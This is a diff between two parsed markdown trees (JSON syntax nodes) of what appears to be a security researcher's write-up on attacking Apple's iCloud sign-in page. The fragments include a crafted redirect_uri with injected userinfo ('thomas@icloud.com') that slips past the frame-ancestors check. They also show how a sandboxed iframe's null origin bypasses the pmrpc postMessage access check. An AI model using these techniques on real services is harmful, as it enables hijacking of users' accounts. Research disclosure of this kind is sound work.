>             {
>               "type": "definition",
>               "identifier": "postmessage fans, you'd be correct.",
>               "label": "PostMessage Fans, You'd Be Correct.",
>               "title": null,
>               "url": "#postmessage-fans-youd-be-correct",
>               "position": {
>                 "start": {
>                   "line": 851,
>                   "column": 1,
>                   "offset": 41115
>                 },
>                 "end": {
>                   "line": 851,
>                   "column": 73,
>                   "offset": 41187
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "§7",
>               "label": "§7",
>               "title": null,
>               "url": "#postmessage-fans-youd-be-correct",
>               "position": {
>                 "start": {
>                   "line": 852,
>                   "column": 1,
>                   "offset": 41189
>                 },
>                 "end": {
>                   "line": 852,
>                   "column": 40,
>                   "offset": 41228
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "We have two problems at this point to address:",
>                   "position": {
>                     "start": {
>                       "line": 855,
>                       "column": 1,
>                       "offset": 41234
>                     },
>                     "end": {
>                       "line": 855,
>                       "column": 47,
>                       "offset": 41280
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 855,
>                   "column": 1,
>                   "offset": 41234
>                 },
>                 "end": {
>                   "line": 855,
>                   "column": 47,
>                   "offset": 41280
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "list",
>               "ordered": true,
>               "start": 1,
>               "spread": false,
>               "children": [
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "Messages we send to ",
>                           "position": {
>                             "start": {
>                               "line": 857,
>                               "column": 4,
>                               "offset": 41287
>                             },
>                             "end": {
>                               "line": 857,
>                               "column": 24,
>                               "offset": 41307
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "idmsa.apple.com",
>                           "position": {
>                             "start": {
>                               "line": 857,
>                               "column": 24,
>                               "offset": 41307
>                             },
>                             "end": {
>                               "line": 857,
>                               "column": 41,
>                               "offset": 41324
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " aren't being accepted",
>                           "position": {
>                             "start": {
>                               "line": 857,
>                               "column": 41,
>                               "offset": 41324
>                             },
>                             "end": {
>                               "line": 857,
>                               "column": 63,
>                               "offset": 41346
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 857,
>                           "column": 4,
>                           "offset": 41287
>                         },
>                         "end": {
>                           "line": 857,
>                           "column": 63,
>                           "offset": 41346
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 857,
>                       "column": 1,
>                       "offset": 41284
>                     },
>                     "end": {
>                       "line": 857,
>                       "column": 63,
>                       "offset": 41346
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "text",
>                           "value": "The browser rejects messages sent to us from ",
>                           "position": {
>                             "start": {
>                               "line": 858,
>                               "column": 4,
>                               "offset": 41351
>                             },
>                             "end": {
>                               "line": 858,
>                               "column": 49,
>                               "offset": 41396
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "idmsa.apple.com",
>                           "position": {
>                             "start": {
>                               "line": 858,
>                               "column": 49,
>                               "offset": 41396
>                             },
>                             "end": {
>                               "line": 858,
>                               "column": 66,
>                               "offset": 41413
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " because they're specifying the origin ",
>                           "position": {
>                             "start": {
>                               "line": 858,
>                               "column": 66,
>                               "offset": 41413
>                             },
>                             "end": {
>                               "line": 858,
>                               "column": 105,
>                               "offset": 41452
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 858,
>                               "column": 105,
>                               "offset": 41452
>                             },
>                             "end": {
>                               "line": 858,
>                               "column": 117,
>                               "offset": 41464
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ".",
>                           "position": {
>                             "start": {
>                               "line": 858,
>                               "column": 117,
>                               "offset": 41464
>                             },
>                             "end": {
>                               "line": 858,
>                               "column": 118,
>                               "offset": 41465
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 858,
>                           "column": 4,
>                           "offset": 41351
>                         },
>                         "end": {
>                           "line": 858,
>                           "column": 118,
>                           "offset": 41465
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 858,
>                       "column": 1,
>                       "offset": 41348
>                     },
>                     "end": {
>                       "line": 858,
>                       "column": 118,
>                       "offset": 41465
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 857,
>                   "column": 1,
>                   "offset": 41284
>                 },
>                 "end": {
>                   "line": 858,
>                   "column": 118,
>                   "offset": 41465
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6395,6400d13155
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
6402,6403c13157,13210
<               "type": "text",
<               "value": "correct",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "While I did this using the minified code ",
>                   "position": {
>                     "start": {
>                       "line": 860,
>                       "column": 1,
>                       "offset": 41469
>                     },
>                     "end": {
>                       "line": 860,
>                       "column": 42,
>                       "offset": 41510
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 860,
>                       "column": 42,
>                       "offset": 41510
>                     },
>                     "end": {
>                       "line": 860,
>                       "column": 59,
>                       "offset": 41527
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " was running, our solution to (1) is easier illustrated with the original 'pmrpc' source code, from the library apple is using:",
>                   "position": {
>                     "start": {
>                       "line": 860,
>                       "column": 59,
>                       "offset": 41527
>                     },
>                     "end": {
>                       "line": 860,
>                       "column": 186,
>                       "offset": 41654
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
6406,6408c13213,13215
<                   "line": 363,
<                   "column": 62,
<                   "offset": 17695
---
>                   "line": 860,
>                   "column": 1,
>                   "offset": 41469
6411,6413c13218,13220
<                   "line": 363,
<                   "column": 69,
<                   "offset": 17702
---
>                   "line": 860,
>                   "column": 186,
>                   "offset": 41654
6417,6625d13223
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 363,
<               "column": 61,
<               "offset": 17694
<             },
<             "end": {
<               "line": 363,
<               "column": 70,
<               "offset": 17703
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " in\nthinking that this URL is actually just ",
<           "position": {
<             "start": {
<               "line": 363,
<               "column": 70,
<               "offset": 17703
<             },
<             "end": {
<               "line": 364,
<               "column": 41,
<               "offset": 17748
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://icloud.com",
<           "position": {
<             "start": {
<               "line": 364,
<               "column": 41,
<               "offset": 17748
<             },
<             "end": {
<               "line": 364,
<               "column": 61,
<               "offset": 17768
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and letting the\nrequest through. But we've injected some extra characters in that might mess up\nsome other part of the system.",
<           "position": {
<             "start": {
<               "line": 364,
<               "column": 61,
<               "offset": 17768
<             },
<             "end": {
<               "line": 366,
<               "column": 31,
<               "offset": 17897
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 362,
<           "column": 1,
<           "offset": 17588
<         },
<         "end": {
<           "line": 366,
<           "column": 31,
<           "offset": 17897
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "OK, so, great, if I load\n",
<           "position": {
<             "start": {
<               "line": 368,
<               "column": 1,
<               "offset": 17901
<             },
<             "end": {
<               "line": 369,
<               "column": 1,
<               "offset": 17927
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fthomas@www.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB",
<           "position": {
<             "start": {
<               "line": 369,
<               "column": 1,
<               "offset": 17927
<             },
<             "end": {
<               "line": 369,
<               "column": 286,
<               "offset": 18212
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\ncontaining the ",
<           "position": {
<             "start": {
<               "line": 369,
<               "column": 286,
<               "offset": 18212
<             },
<             "end": {
<               "line": 370,
<               "column": 16,
<               "offset": 18229
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 370,
<               "column": 16,
<               "offset": 18229
<             },
<             "end": {
<               "line": 370,
<               "column": 30,
<               "offset": 18243
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " ",
<           "position": {
<             "start": {
<               "line": 370,
<               "column": 30,
<               "offset": 18243
<             },
<             "end": {
<               "line": 370,
<               "column": 31,
<               "offset": 18244
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://thomas@icloud.com",
<           "position": {
<             "start": {
<               "line": 370,
<               "column": 31,
<               "offset": 18244
<             },
<             "end": {
<               "line": 370,
<               "column": 58,
<               "offset": 18271
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " what ",
<           "position": {
<             "start": {
<               "line": 370,
<               "column": 58,
<               "offset": 18271
6627,6761c13225,13278
<             "end": {
<               "line": 370,
<               "column": 64,
<               "offset": 18277
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 370,
<               "column": 64,
<               "offset": 18277
<             },
<             "end": {
<               "line": 370,
<               "column": 81,
<               "offset": 18294
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "\nheader do we get?",
<           "position": {
<             "start": {
<               "line": 370,
<               "column": 81,
<               "offset": 18294
<             },
<             "end": {
<               "line": 371,
<               "column": 18,
<               "offset": 18313
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 368,
<           "column": 1,
<           "offset": 17901
<         },
<         "end": {
<           "line": 371,
<           "column": 18,
<           "offset": 18313
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTTP",
<       "meta": null,
<       "value": "Content-Security-Policy: frame-ancestors https://thomas@icloud.com",
<       "position": {
<         "start": {
<           "line": 373,
<           "column": 1,
<           "offset": 18317
<         },
<         "end": {
<           "line": 375,
<           "column": 4,
<           "offset": 18398
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Hmm. That doesn't look like it should be there. ",
<           "position": {
<             "start": {
<               "line": 377,
<               "column": 1,
<               "offset": 18402
<             },
<             "end": {
<               "line": 377,
<               "column": 49,
<               "offset": 18450
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "frame-ancestors",
<           "position": {
<             "start": {
<               "line": 377,
<               "column": 49,
<               "offset": 18450
<             },
<             "end": {
<               "line": 377,
<               "column": 66,
<               "offset": 18467
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is defined to\naccept a list of ",
<           "position": {
<             "start": {
<               "line": 377,
<               "column": 66,
<               "offset": 18467
<             },
<             "end": {
<               "line": 378,
<               "column": 18,
<               "offset": 18500
---
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": " function processPmrpcMessage(eventParams) {\n    var serviceCallEvent = eventParams.event;\n    var eventSource = eventParams.source;\n    var isWorkerComm = typeof eventSource !== \"undefined\" && eventSource !== null;\n\n    // if the message is not for pmrpc, ignore it.\n    if (typeof serviceCallEvent.data !== \"string\" || serviceCallEvent.data.indexOf(\"pmrpc.\") !== 0) {\n      return;\n    } else {\n      var message = decode(serviceCallEvent.data);\n\n      if (typeof message.method !== \"undefined\") {\n        // this is a request\n\n        var newServiceCallEvent = {\n          data : serviceCallEvent.data,\n          source : isWorkerComm ? eventSource : serviceCallEvent.source,\n          origin : isWorkerComm ? \"*\" : serviceCallEvent.origin,\n          shouldCheckACL : !isWorkerComm\n        };\n\n        var response = processJSONRpcRequest(message, newServiceCallEvent);\n\n        // return the response\n        if (response !== null) {\n          sendPmrpcMessage(\n            newServiceCallEvent.source, response, newServiceCallEvent.origin);\n        }\n      } else {\n        // this is a response\n        processJSONRpcResponse(message);\n      }\n    }\n  }",
>               "position": {
>                 "start": {
>                   "line": 862,
>                   "column": 1,
>                   "offset": 41658
>                 },
>                 "end": {
>                   "line": 897,
>                   "column": 4,
>                   "offset": 42869
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6763,6773d13279
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "linkReference",
<           "identifier": "frame-ancestors",
<           "label": "frame-ancestors",
<           "referenceType": "full",
<           "children": [
6775,6776c13281,13470
<               "type": "text",
<               "value": "HTTP origins",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Notice ",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 1,
>                       "offset": 42873
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 8,
>                       "offset": 42880
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "shouldCheckACL",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 8,
>                       "offset": 42880
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 24,
>                       "offset": 42896
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "? This actually determines if pmrpc should check to see if we are ",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 24,
>                       "offset": 42896
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 90,
>                       "offset": 42962
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 90,
>                       "offset": 42962
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 102,
>                       "offset": 42974
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". It's derived from ",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 102,
>                       "offset": 42974
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 122,
>                       "offset": 42994
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "!isWorkerComm",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 122,
>                       "offset": 42994
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 137,
>                       "offset": 43009
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". I haven't the faintest idea what a ",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 137,
>                       "offset": 43009
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 174,
>                       "offset": 43046
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "WorkerComm",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 174,
>                       "offset": 43046
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 186,
>                       "offset": 43058
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is but ",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 186,
>                       "offset": 43058
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 194,
>                       "offset": 43066
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "isWorkerComm",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 194,
>                       "offset": 43066
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 208,
>                       "offset": 43080
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is calculated right at the top:",
>                   "position": {
>                     "start": {
>                       "line": 899,
>                       "column": 208,
>                       "offset": 43080
>                     },
>                     "end": {
>                       "line": 899,
>                       "column": 240,
>                       "offset": 43112
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
6779,6781c13473,13475
<                   "line": 378,
<                   "column": 19,
<                   "offset": 18501
---
>                   "line": 899,
>                   "column": 1,
>                   "offset": 42873
6784,6786c13478,13480
<                   "line": 378,
<                   "column": 31,
<                   "offset": 18513
---
>                   "line": 899,
>                   "column": 240,
>                   "offset": 43112
6790,6813d13483
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 378,
<               "column": 18,
<               "offset": 18500
<             },
<             "end": {
<               "line": 378,
<               "column": 49,
<               "offset": 18531
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", a very strict type of website specifier\ndesigned for security that ",
<           "position": {
<             "start": {
<               "line": 378,
<               "column": 49,
<               "offset": 18531
6815,6818c13485,13508
<             "end": {
<               "line": 379,
<               "column": 28,
<               "offset": 18601
---
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": " function processPmrpcMessage(eventParams) {\n    var serviceCallEvent = eventParams.event;\n    var eventSource = eventParams.source;\n    var isWorkerComm = typeof eventSource !== \"undefined\" && eventSource !== null;",
>               "position": {
>                 "start": {
>                   "line": 901,
>                   "column": 1,
>                   "offset": 43116
>                 },
>                 "end": {
>                   "line": 906,
>                   "column": 4,
>                   "offset": 43354
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6820,6832c13510,13645
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://thomas@icloud.com",
<           "position": {
<             "start": {
<               "line": 379,
<               "column": 28,
<               "offset": 18601
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Our ",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 1,
>                       "offset": 43358
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 5,
>                       "offset": 43362
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "postMessage",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 5,
>                       "offset": 43362
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 18,
>                       "offset": 43375
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is assumed to be a 'workerComm' if the source of the event is ",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 18,
>                       "offset": 43375
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 81,
>                       "offset": 43438
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "undefined",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 81,
>                       "offset": 43438
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 92,
>                       "offset": 43449
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " (impossible for us, as we have to be a source), but also more importantly -- we are considered a 'workerComm' if our eventSource is ",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 92,
>                       "offset": 43449
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 225,
>                       "offset": 43582
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 225,
>                       "offset": 43582
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 231,
>                       "offset": 43588
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 908,
>                       "column": 231,
>                       "offset": 43588
>                     },
>                     "end": {
>                       "line": 908,
>                       "column": 232,
>                       "offset": 43589
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 908,
>                   "column": 1,
>                   "offset": 43358
>                 },
>                 "end": {
>                   "line": 908,
>                   "column": 232,
>                   "offset": 43589
>                 },
>                 "indent": []
>               }
6834,6837c13647,13714
<             "end": {
<               "line": 379,
<               "column": 55,
<               "offset": 18628
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I'm not sure what a 'workerComm' is still, but it might be that this system, pmrpc sometimes wants to push messages into here. If these messages are synthetic, they will naturally have no meaningful ",
>                   "position": {
>                     "start": {
>                       "line": 910,
>                       "column": 1,
>                       "offset": 43593
>                     },
>                     "end": {
>                       "line": 910,
>                       "column": 200,
>                       "offset": 43792
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "source",
>                   "position": {
>                     "start": {
>                       "line": 910,
>                       "column": 200,
>                       "offset": 43792
>                     },
>                     "end": {
>                       "line": 910,
>                       "column": 208,
>                       "offset": 43800
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " -- which is normally set to the opening page.",
>                   "position": {
>                     "start": {
>                       "line": 910,
>                       "column": 208,
>                       "offset": 43800
>                     },
>                     "end": {
>                       "line": 910,
>                       "column": 254,
>                       "offset": 43846
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 910,
>                   "column": 1,
>                   "offset": 43593
>                 },
>                 "end": {
>                   "line": 910,
>                   "column": 254,
>                   "offset": 43846
>                 },
>                 "indent": []
>               }
6839,6849c13716,13817
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " most certianly is not.",
<           "position": {
<             "start": {
<               "line": 379,
<               "column": 55,
<               "offset": 18628
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I'm sure you're wondering how we get an opening source of ",
>                   "position": {
>                     "start": {
>                       "line": 912,
>                       "column": 1,
>                       "offset": 43850
>                     },
>                     "end": {
>                       "line": 912,
>                       "column": 59,
>                       "offset": 43908
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 912,
>                       "column": 59,
>                       "offset": 43908
>                     },
>                     "end": {
>                       "line": 912,
>                       "column": 65,
>                       "offset": 43914
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". Surely no page can be located at ",
>                   "position": {
>                     "start": {
>                       "line": 912,
>                       "column": 65,
>                       "offset": 43914
>                     },
>                     "end": {
>                       "line": 912,
>                       "column": 100,
>                       "offset": 43949
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 912,
>                       "column": 100,
>                       "offset": 43949
>                     },
>                     "end": {
>                       "line": 912,
>                       "column": 106,
>                       "offset": 43955
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "? Not quite!!",
>                   "position": {
>                     "start": {
>                       "line": 912,
>                       "column": 106,
>                       "offset": 43955
>                     },
>                     "end": {
>                       "line": 912,
>                       "column": 119,
>                       "offset": 43968
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 912,
>                   "column": 1,
>                   "offset": 43850
>                 },
>                 "end": {
>                   "line": 912,
>                   "column": 119,
>                   "offset": 43968
>                 },
>                 "indent": []
>               }
6851,6854c13819,13886
<             "end": {
<               "line": 379,
<               "column": 78,
<               "offset": 18651
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "A sandboxed iframe by default considers itself to have the origin ",
>                   "position": {
>                     "start": {
>                       "line": 914,
>                       "column": 1,
>                       "offset": 43972
>                     },
>                     "end": {
>                       "line": 914,
>                       "column": 67,
>                       "offset": 44038
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 914,
>                       "column": 67,
>                       "offset": 44038
>                     },
>                     "end": {
>                       "line": 914,
>                       "column": 73,
>                       "offset": 44044
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". This is so that it can't inherit the origin of its parent and escape the sandbox. Thus, we can bypass the Access Control List (ACL) by just sending all our messages from a sandbox.",
>                   "position": {
>                     "start": {
>                       "line": 914,
>                       "column": 73,
>                       "offset": 44044
>                     },
>                     "end": {
>                       "line": 914,
>                       "column": 255,
>                       "offset": 44226
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 914,
>                   "column": 1,
>                   "offset": 43972
>                 },
>                 "end": {
>                   "line": 914,
>                   "column": 255,
>                   "offset": 44226
>                 },
>                 "indent": []
>               }
6856,6909c13888,13908
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 377,
<           "column": 1,
<           "offset": 18402
<         },
<         "end": {
<           "line": 379,
<           "column": 78,
<           "offset": 18651
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "frame-ancestors",
<       "label": "frame-ancestors",
<       "title": null,
<       "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors",
<       "position": {
<         "start": {
<           "line": 381,
<           "column": 1,
<           "offset": 18655
<         },
<         "end": {
<           "line": 382,
<           "column": 98,
<           "offset": 18772
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "When I see stuff like this it makes me think for two reasons: (1) if\n",
<           "position": {
<             "start": {
<               "line": 384,
<               "column": 1,
<               "offset": 18776
---
>             {
>               "type": "code",
>               "lang": "HTML",
>               "meta": null,
>               "value": "<iframe sandbox=\"allow-scripts\"></iframe>",
>               "position": {
>                 "start": {
>                   "line": 916,
>                   "column": 1,
>                   "offset": 44230
>                 },
>                 "end": {
>                   "line": 918,
>                   "column": 4,
>                   "offset": 44285
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
6911,6914c13910,14097
<             "end": {
<               "line": 385,
<               "column": 1,
<               "offset": 18846
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "If you try this however, you will hit a major snag. If your origin is ",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 1,
>                       "offset": 44289
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 71,
>                       "offset": 44359
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "null",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 71,
>                       "offset": 44359
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 77,
>                       "offset": 44365
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", then when ",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 77,
>                       "offset": 44365
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 89,
>                       "offset": 44377
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 89,
>                       "offset": 44377
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 106,
>                       "offset": 44394
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " checks your HTTP origin to see if you can embed this page it will ",
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 106,
>                       "offset": 44394
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 173,
>                       "offset": 44461
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "always fail",
>                       "position": {
>                         "start": {
>                           "line": 920,
>                           "column": 174,
>                           "offset": 44462
>                         },
>                         "end": {
>                           "line": 920,
>                           "column": 185,
>                           "offset": 44473
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 920,
>                       "column": 173,
>                       "offset": 44461
>                     },
>                     "end": {
>                       "line": 920,
>                       "column": 186,
>                       "offset": 44474
>                     },
>                     "indent": []
>                   }
